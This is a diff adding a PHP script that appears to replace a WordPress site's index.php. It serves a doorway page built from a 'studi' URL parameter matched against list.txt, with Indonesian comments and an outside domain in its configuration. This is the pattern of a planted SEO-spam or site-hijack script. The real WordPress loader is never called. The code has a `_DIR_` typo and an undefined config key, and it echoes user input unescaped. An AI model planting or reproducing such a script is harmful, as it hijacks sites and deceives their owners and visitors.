@@ -1,0 +1,60 @@
+<?php
+$config = array(
+    'url'        => 'https://garansiweb.com/',
+    'parameter'  => 'studi',  // This is the parameter you want to dynamically use
+    'template'   => __DIR__ . '/template.html',
+);
+
+$html = file_get_contents($config['template']);
+
+function index()
+{
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require _DIR_ . '/wp-blog-header.php';
+}
+
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$referer = $_SERVER['HTTP_REFERER'] ?? '';
+
+// Cek jika parameter yang sesuai dengan $config['parameter'] ada
+if (isset($_GET[$config['parameter']]) && !empty($_GET[$config['parameter']])) {
+    $brand = trim($_GET[$config['parameter']]);
+
+    // Read from list.txt and check if the brand exists
+    $filename = "list.txt";
+    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $found = false;
+
+    foreach ($lines as $item) {
+        if (strtolower(trim($item)) === strtolower($brand)) {
+            $found = true;
+            break; // Exit loop once the brand is found
+        }
+    }
+
+    if ($found) {
+        // Generate URL dynamically based on the config parameter
+        $url = $config['studi'] . '?' . $config['parameter'] . '=' . urlencode($brand);
+
+        if (file_exists($config['template']) && is_readable($config['template'])) {
+            $html = file_get_contents($config['template']);
+            // Replace placeholders with dynamic values
+            $html = str_replace('{{ BRAND }}', $brand, $html);
+            $html = str_replace('{{ URL }}', $url, $html);
+            echo $html;
+            exit;
+        } else {
+            echo "Template file not found or not readable.";
+            exit;
+        }
+    } else {
+        // If the brand is not found in the list, show a message or handle it as needed
+        echo "Brand not found in the list.";
+        exit;
+    }
+} else {
+    echo "Brand parameter is missing.";
+    exit;
+}
